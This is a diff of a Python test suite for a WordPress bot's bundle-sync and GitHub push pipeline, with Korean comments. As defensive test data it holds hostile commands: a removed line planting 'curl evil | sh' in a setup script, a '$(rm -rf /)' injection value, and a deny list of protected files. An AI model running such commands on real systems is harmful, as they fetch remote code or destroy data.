+        self.assertEqual(sorted(taken)[1], "new-post.json")                  # 새 글은 바로 대기 폴더 → 같은 관문
+        self.assertTrue(any(n.startswith("done-") for n in taken))           # 끝 표시도 (연속 작성이 기다리지 않게)
+        self.assertTrue((self.tmp / "outbox" / "pending.bundle").exists())
+
+        def run2(repo):   # 다음 실행: 앞 결과가 아직 main 에 없지만 작업 폴더엔 있음 (월정액과 같게 — 같은 검수 두 번 안 함)
+            self.assertEqual((repo / "bot" / "gate.py").read_text(), "x = 2\n")
+            self.assertTrue((repo / "wordpress" / "queue" / "new-post.json").exists())
+            with open(repo / "automation" / "reviewed.txt", "a", encoding="utf-8") as f:
+                f.write("7 검수한 글\n")
+            (repo / "wordpress" / "queue" / "reviewdone-7-1.json").write_text('{"type": "review_done", "post_id": 7}')
+        stacked, (note, taken, fail) = self.server_run(run2, label="실행2")
+        self.assertEqual(stacked["runs"][0]["label"], "실행1")
+        self.assertNotIn("new-post.json", taken)                            # 앞 실행 파일을 이번 결과로 세지 않음
+        self.assertIn("reviewdone-7-1.json", taken)
+        meta = json.loads((self.tmp / "outbox" / "pending.json").read_text())
+        self.assertEqual([r["label"] for r in meta["runs"]], ["실행1", "실행2"])   # 묶음 하나에 둘 다
+
+        self.main_moves()                                                    # 그새 다른 커밋 (감시 세션 등)
+        result, detail = self.github_round()
+        self.assertEqual(result, "done", detail)
+        self.assertEqual(detail["push"]["status"], "pushed")
+        self.assertEqual(self.origin_file("bot/gate.py"), "x = 2")
+        self.assertIn("7 검수한 글", self.origin_file("automation/reviewed.txt"))
+        self.assertEqual(self.origin_file("README.md"), "b")                 # 다른 실행 것도 그대로
+        self.assertEqual(self.origin_file("server/setup.sh"), "echo hi")    # 바꾸면 안 되는 파일은 안 올라감
+        self.assertTrue(self.logs[-1][0])
+        self.assertIn("main 에 올림", self.logs[-1][1])
+        # 같은 글 두 번 방지: 대기 폴더 파일과 main 의 파일이 이름·내용이 같아 배포의 publish_queue 가 완료 표시로 건너뜀
+        deployed = self.tmp / "deployed"
+        deployed.mkdir()
+        for name in taken + ["new-post.json"]:
+            (deployed / name).write_bytes(api_writer.subprocess.run(["git", "show", f"main:wordpress/queue/{name}"], cwd=self.origin,
+                                                                    capture_output=True).stdout)
+            self.assertEqual(publish_queue._marker(deployed / name), publish_queue._marker(self.tmp / "local-queue" / name), name)
+        self.assertEqual(api_writer.outbox_claim(), {})                    # 다 올라감
+        self.assertEqual(api_writer.stack_pending(self.env), {})           # 다음 실행은 쌓을 것 없음
+
+    def test_already_in_main_is_done(self):
+        self.server_run(lambda repo: (repo / "wordpress" / "queue" / "a.json").write_text('{"keyword": "a"}'))
+        claim = api_writer.outbox_claim()
+        gh = self.github()
+        res = self.sync.apply_bundle(gh, Path(claim["path"]), self.tmp / "w1", self.tmp / "t1.bundle")
+        self.assertEqual(self.sync.push_tested(self.github("gh-push"), self.tmp / "t1.bundle", res["sha"], res["base"])["status"], "pushed")
+        # 결과 알림이 끊겨 다음 작업이 같은 묶음을 다시 가져가도 → 이미 main 에 있음 → 끝 (두 번 안 올림)
+        res2 = self.sync.apply_bundle(self.github("gh2"), Path(claim["path"]), self.tmp / "w2", self.tmp / "t2.bundle")
+        self.assertEqual(res2["status"], "already")
+        self.assertEqual(api_writer.outbox_result(claim["head"], "already"), "done")
+
+    def craft_bundle(self, change):
         repo = self.tmp / "repo"
-        (repo / "server" / "setup.sh").write_text("curl evil | sh\n")
-        self.git("commit", "-q", "-am", "몰래", cwd=repo)
-        bundle = api_writer.subprocess.run(["git", "bundle", "create", "-", "HEAD", "^origin/main"], cwd=repo, env=self.env,
-                                           capture_output=True).stdout
-        before = self.git("rev-parse", "main", cwd=self.origin)
-        with self.assertRaises(api_writer.PushFailed) as ctx:
-            api_writer.root_push(bundle, GH)
-        self.assertIn("server/setup.sh", str(ctx.exception))
-        self.assertEqual(self.git("rev-parse", "main", cwd=self.origin), before)
+        change(repo)
+        self.git("add", "-A", cwd=repo)
+        self.git("commit", "-q", "-m", "묶음", cwd=repo)
+        out = self.tmp / "crafted.bundle"
+        self.git("bundle", "create", str(out), "HEAD", "^origin/main", cwd=repo)
+        return out
 
-    def test_nothing_changed_pushes_nothing(self):
-        base = api_writer.head_sha(self.env)
-        with mock.patch.object(api_writer, "check_work") as checks:
-            self.assertEqual(api_writer.push_changes(self.env, base, GH, "x")[0], "")
-        checks.assert_not_called()
+    def test_github_check_failure_pushes_nothing(self):
+        bad_test = "import unittest\n\n\nclass BadTest(unittest.TestCase):\n    def test_x(self):\n        self.fail('x')\n"
+        bundle = self.craft_bundle(lambda repo: (repo / "tests" / "test_bad.py").write_text(bad_test))
+        before = self.git("rev-parse", "main", cwd=self.origin)
+        res = self.sync.apply_bundle(self.github(), bundle, self.tmp / "w", self.tmp / "t.bundle")
+        self.assertEqual(res["status"], "failed")
+        self.assertIn("BadTest.test_x", res["why"])
+        self.assertFalse((self.tmp / "t.bundle").exists())
+        self.assertEqual(self.git("rev-parse", "main", cwd=self.origin), before)
+        self.assertEqual(self.sync.final_status("success", "failed", res["why"], "skipped", "", "", "")[0], "failed")
+
+    def test_github_refuses_disallowed_files(self):
+        """서버 쪽에서 이미 빼지만, GitHub 쪽도 main 의 목록으로 다시 확인 (묶음이 서버 설정·워크플로·이 검사 코드를 못 바꿈)."""
+        for rel in ("server/setup.sh", ".github/workflows/deploy.yml", "bot/api_writer.py", "automation/api_sync.py"):
+            with self.subTest(rel=rel):
+                self.git("checkout", "-q", "-f", "-B", "x", "origin/main", cwd=self.tmp / "repo")
+                def change(repo, rel=rel):
+                    (repo / rel).parent.mkdir(parents=True, exist_ok=True)
+                    (repo / rel).write_text("bad\n")
+                bundle = self.craft_bundle(change)
+                res = self.sync.apply_bundle(self.github(f"gh-{rel.replace('/', '_')}"), bundle,
+                                             self.tmp / f"w-{rel.replace('/', '_')}", self.tmp / "t.bundle")
+                self.assertEqual(res["status"], "failed")
+                self.assertIn(rel, res["why"])
+
+    def test_main_moved_before_push_is_retry(self):
+        bundle = self.craft_bundle(lambda repo: (repo / "wordpress" / "queue" / "b.json").write_text('{"keyword": "b"}'))
+        res = self.sync.apply_bundle(self.github(), bundle, self.tmp / "w", self.tmp / "t.bundle")
+        self.assertEqual(res["status"], "ok")
+        self.main_moves("c\n")
+        push = self.sync.push_tested(self.github("gh-push"), self.tmp / "t.bundle", res["sha"], res["base"])
+        self.assertEqual(push["status"], "moved")
+        self.assertEqual(self.sync.final_status("success", "ok", "", "success", "moved", push["why"], res["sha"])[0], "retry")
+        self.assertEqual(self.origin_file("README.md"), "c")
+
+    def test_final_status_table(self):
+        f = self.sync.final_status
+        self.assertEqual(f("failure", "", "", "skipped", "", "", ""), ("retry", "", "검사 작업이 끝나지 않음 (failure)"))
+        self.assertEqual(f("success", "ok", "", "success", "pushed", "", "abc")[:2], ("pushed", "abc"))
+        self.assertEqual(f("success", "ok", "", "success", "failed", "main 에 push 거절: 403", "abc"),
+                         ("failed", "", "main 에 push 거절: 403"))
+        self.assertEqual(f("success", "ok", "", "failure", "", "", "abc")[0], "retry")
+        self.assertEqual(f("success", "already", "", "skipped", "", "", "")[0], "already")
+
+
+class ApiSyncCommandTest(unittest.TestCase):
+    """GitHub 작업 명령: 서버에 못 닿아도 배포를 막지 않고, 매일 점검 보고는 문제 있을 때만 실패(→ GitHub 메일), 내용은 안 찍음."""
+
+    def setUp(self):
+        sys.path.insert(0, str(ROOT / "automation"))
+        import api_sync
+        self.sync = api_sync
+
+    def run_maint(self, report):
+        remote = mock.Mock()
+        remote.outbox.return_value = report
+        import io
+        from contextlib import redirect_stdout
+        buf = io.StringIO()
+        with mock.patch.object(self.sync, "remote_from_env", return_value=remote), redirect_stdout(buf):
+            code = self.sync.main(["maint"])
+        remote.outbox.assert_called_once_with("report")
+        return code, buf.getvalue()
+
+    def test_maint_exit_codes(self):
+        self.assertEqual(self.run_maint({})[0], 0)
+        self.assertEqual(self.run_maint({"at": "2026-11-12 06:15", "problems": 0})[0], 0)
+        code, out = self.run_maint({"at": "2026-11-12 06:15", "problems": 2})
+        self.assertEqual(code, 1)
+        self.assertIn("문제 2건", out)
+        self.assertIn("봇 기록", out)
+        self.assertEqual(self.run_maint({"at": "x", "problems": -2})[0], 1)
+
+    def test_unreachable_server_does_not_fail(self):
+        with mock.patch.object(self.sync, "remote_from_env", side_effect=OSError("연결 안 됨")), \
+                mock.patch.dict(os.environ, {"GITHUB_OUTPUT": ""}):
+            self.assertEqual(self.sync.main(["maint"]), 0)
+            with tempfile.TemporaryDirectory() as d:
+                self.assertEqual(self.sync.main(["fetch", "--out", d]), 0)
+
+    def test_report_quotes_untrusted_values(self):
+        remote = mock.Mock()
+        remote.outbox.return_value = {"result": "failed"}
+        env = {"HEAD_SHA": "h1", "CHECK_RESULT": "success", "CHECK_STATUS": "failed", "CHECK_WHY": "검사 실패: $(rm -rf /)",
+               "PUSH_RESULT": "skipped"}
+        with mock.patch.object(self.sync, "remote_from_env", return_value=remote), mock.patch.dict(os.environ, env):
+            self.sync.main(["report"])
+        args = remote.outbox.call_args.args
+        self.assertEqual(args[:5], ("result", "--head", "h1", "--status", "failed"))
+        self.assertIn("$(rm -rf /)", args[-1])            # 값 그대로 한 인자로 (서버 명령에서는 shlex.quote)
+        src = (ROOT / "automation" / "api_sync.py").read_text(encoding="utf-8")
+        self.assertIn("shlex.quote", src)
+
+
+class WorkflowTest(unittest.TestCase):
+    """deploy.yml·health.yml 의 API 봇 반영·알림 작업: 권한 나눔, 같은 실행에서 배포, 기존 배포 그대로."""
+
+    def jobs(self, name):
+        """작업 이름 → 그 작업 글자 (yaml 패키지 없이: 'jobs:' 아래 두 칸 들여쓴 이름 줄로 나눔)."""
+        text = (ROOT / ".github" / "workflows" / name).read_text(encoding="utf-8").split("\njobs:\n", 1)[1]
+        parts = re.split(r"^  ([a-z_]+):\n", text, flags=re.M)
+        return dict(zip(parts[1::2], parts[2::2]))
+
+    def test_deploy_sync_jobs(self):
+        jobs = self.jobs("deploy.yml")
+        self.assertEqual(list(jobs), ["sync_fetch", "sync_check", "sync_push", "sync_report", "gate", "check", "deploy"])
+        self.assertIn("if: github.event_name != 'push'", jobs["sync_fetch"])
+        self.assertEqual([k for k, v in jobs.items() if "contents: write" in v], ["sync_push"])   # main 에 쓰는 작업은 하나
+        self.assertNotIn("secrets.", jobs["sync_check"])               # 묶음 코드를 돌리는 작업엔 비밀값 없음
+        self.assertNotIn("secrets.", jobs["sync_push"])
+        self.assertIn("persist-credentials: false", jobs["sync_check"])
+        self.assertNotIn("unittest", jobs["sync_push"])                # push 작업은 묶음 코드를 안 돌림
+        self.assertIn("api_sync.py push", jobs["sync_push"])
+        self.assertIn("needs: sync_push", jobs["gate"])                 # 올린 main 을 같은 실행에서 배포
+        self.assertIn("if: ${{ !cancelled() }}", jobs["gate"])
+        self.assertIn("!cancelled() && needs.gate.result == 'success'", jobs["check"])
+        self.assertIn("needs.check.result == 'success'", jobs["deploy"])
+        for name in ("sync_fetch", "sync_report"):
+            self.assertIn("secrets.SERVER_PASSWORD", jobs[name])
+        for name, body in jobs.items():                                 # 작업 출력(검사 결과 등)은 환경 변수로만 — 명령 글자에 바로 안 넣음
+            for line in body.splitlines():
+                if line.strip().startswith("run:"):
+                    self.assertNotIn("needs.sync", line, name)
+
+    def test_health_maint_report_job(self):
+        jobs = self.jobs("health.yml")
+        self.assertIn("api_sync.py maint", jobs["maint_report"])
+        self.assertIn("'23 0 * * *'", jobs["health"])               # 하루 1번 건강 점검은 그대로 하루 1번
+        wf = (ROOT / ".github" / "workflows" / "health.yml").read_text(encoding="utf-8")
+        self.assertRegex(wf, r'cron: "\d+(,\d+){3} \* \* \* \*"')       # 보고는 15분마다
 
 
 class CheckParityTest(unittest.TestCase):
@@ -495,6 +849,15 @@ class CheckParityTest(unittest.TestCase):
             self.assertIn(in_script, script)
             self.assertIn(in_src, src)
 
+    def test_github_uses_same_checks(self):
+        src = (ROOT / "automation" / "api_sync.py").read_text(encoding="utf-8")
+        self.assertIn("from bot.api_writer import check_work, push_allowed", src)
+        self.assertIn("check_work(run_cmd)", src)
+        deploy = (ROOT / ".github" / "workflows" / "deploy.yml").read_text(encoding="utf-8")
+        for step in ("compileall -q bot tests", "node tests/test_calculators.mjs", "wordpress/patches.json"):
+            self.assertIn(step, deploy)   # 배포 검사에 있는 것은 반영 검사(check_work)에도
+        self.assertIn('"compileall", "-q", "bot", "tests"', (ROOT / "bot" / "api_writer.py").read_text(encoding="utf-8"))
+
     def test_failed_test_names(self):
         out = "FAIL: test_a (test_bot.BotTest.test_a)\nERROR: test_b (test_bot.GateTest)\nok"
         self.assertEqual(api_writer._failed_tests(out), ["BotTest.test_a", "GateTest.test_b"])   # 3.11+ 와 3.10 출력
@@ -504,7 +867,8 @@ class CheckParityTest(unittest.TestCase):
                    "tests/test_bot.py", "wordpress/themes/first-lab/calculators/data/x.json", "wordpress/pages/x-calculator.html"):
             self.assertTrue(api_writer.push_allowed(ok), ok)
         for bad in ("server/setup.sh", ".github/workflows/deploy.yml", "CLAUDE.md", "automation/daily-writer.md",
-                    "wordpress/mu-plugins/first-lab-api.php", "bot/api_writer.py", "bot/config.py"):
+                    "wordpress/mu-plugins/first-lab-api.php", "bot/api_writer.py", "bot/config.py", "automation/api_sync.py",
+                    ".gitattributes", "automation/merge_json_list.py", "automation/check_and_push.sh"):
             self.assertFalse(api_writer.push_allowed(bad), bad)
 
 
@@ -525,11 +889,13 @@ class WiringTest(unittest.TestCase):
         writer = (ROOT / "automation" / "daily-writer.md").read_text(encoding="utf-8")
         self.assertIn("FIRSTLAB_LOCAL=1", writer)
         self.assertIn("FIRSTLAB_LOCAL=push", writer)
-        self.assertIn("FIRSTLAB_LOCAL=1", api_writer.claude_command("m", 1, "")[2])
-        self.assertIn("FIRSTLAB_LOCAL=push", api_writer.claude_command("m", 1, "", "push")[2])
+        self.assertIn("FIRSTLAB_LOCAL=push", api_writer.claude_command("m", 1, "")[2])
+        self.assertIn("FIRSTLAB_LOCAL=1", api_writer.claude_command("m", 1, "", "1")[2])
         page = (ROOT / "wordpress" / "mu-plugins" / "first-lab-bot-settings.php").read_text(encoding="utf-8")
-        self.assertIn("GITHUB_PUSH_TOKEN", page)   # 설정 화면 설명에 토큰 이야기 (토큰 입력 칸은 없음 — 서버 비밀값으로만)
-        self.assertNotIn("github_push_token", page)
+        self.assertNotIn("GITHUB_PUSH_TOKEN", page)   # 11/12 '예비 필요 없고 …': 운영자가 따로 넣을 토큰 없음
+        self.assertIn("따로 넣을 것은 Claude API 키뿐", page)
+        for doc in ("README.md", "server/set-secrets.sh", "automation/daily-writer.md"):
+            self.assertNotIn("GITHUB_PUSH_TOKEN", (ROOT / doc).read_text(encoding="utf-8"), doc)
         self.assertIn("요금만 다름", page)
         self.assertNotIn("API 봇이 1~3분 안에", page)
 
@@ -540,9 +906,17 @@ class WiringTest(unittest.TestCase):
         self.assertIn(str(Path(api_writer.CLAUDE_BIN).parent.parent), setup)   # --prefix /opt/first-lab-claude
         self.assertIn(api_writer.WRITER_USER, setup)
         self.assertIn(str(publish_queue.LOCAL_QUEUE_DIR), setup)
+        self.assertIn(f"install -d -m 700 {api_writer.OUTBOX}", setup)   # root 전용 (배포 SSH 계정 root 만 읽음)
 
     def test_writer_timeout_shorter_than_continuous(self):
         self.assertLess(api_writer.RUN_TIMEOUT_MIN, run.CONTINUOUS_TIMEOUT_MIN)
+
+    def test_one_writer_fits_memory(self):
+        """2번 작성자: 글쓰기 한 번 상한 1200MB × 2 는 2GB 서버(워드프레스·사주데이 포함)에 못 들어감 → API 봇은 한 칸,
+        연속 작성은 한 편 끝나면 바로 다음 편 (11/12 확인)."""
+        self.assertGreater(int(api_writer.MEMORY_MAX.rstrip("M")) * 2, 2048)   # 두 개면 서버 전체 메모리를 넘음
+        src = (ROOT / "bot" / "run.py").read_text(encoding="utf-8")
+        self.assertIn('active = WRITERS if writer2_on() and settings.write_mode != "bot" else 1', src)
 
 
 if __name__ == "__main__":
